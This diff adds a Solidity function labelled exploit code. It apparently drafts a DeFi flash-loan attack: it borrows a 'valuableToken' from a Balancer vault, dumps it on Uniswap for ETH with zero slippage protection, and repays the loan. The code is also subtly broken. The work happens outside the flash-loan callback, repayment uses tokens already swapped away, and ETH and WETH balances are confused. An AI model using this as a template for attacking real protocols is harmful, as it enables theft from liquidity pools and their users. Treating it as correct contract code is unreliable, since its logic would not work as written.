@@ -1,0 +1,45 @@
+```plaintext
+<executeExploitCode>
+    function executeExploit(uint256 amount) internal {
+        // Check the amount of WETH we have before making the flash loan
+        uint256 wethBalance = IWETH(uniswapRouter.WETH()).balanceOf(address(this));
+        console.log("Current WETH balance: %s", wethBalance);
+        
+        // We will flash loan the maximum available amount of a valuable token
+        address[] memory tokens = new address[](1);
+        tokens[0] = address(valuableToken);
+
+        uint256[] memory amounts = new uint256[](1);
+        amounts[0] = amount; // Using the flash loaned amount
+
+        // Now we flashloan the valuable token
+        IBalancerVault(flashloanProvider).flashLoan(address(this), tokens, amounts, "");
+
+        // Process obtained valuable tokens
+        uint256 valuableTokenAmount = valuableToken.balanceOf(address(this));
+        console.log("Obtained valuableToken: %s", valuableTokenAmount);
+
+        // Swap valuableToken for WETH on Uniswap
+        address[] memory path = new address[](2);
+        path[0] = address(valuableToken);
+        path[1] = uniswapRouter.WETH();
+
+        // Make the swap and check the amount received
+        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            valuableTokenAmount,
+            0, // we accept any amount of WETH
+            path,
+            address(this),
+            block.timestamp + 300
+        );
+
+        // Withdraw the WETH to confirm the amount we received
+        uint256 newWethBalance = IWETH(uniswapRouter.WETH()).balanceOf(address(this));
+        console.log("New WETH balance after swap: %s", newWethBalance);
+
+        // Repay the flash loan
+        valuableToken.transfer(flashloanProvider, amount);
+        console.log("Repayed flash loan of valuableToken: %s", amount);
+    }
+</executeExploitCode>
+```
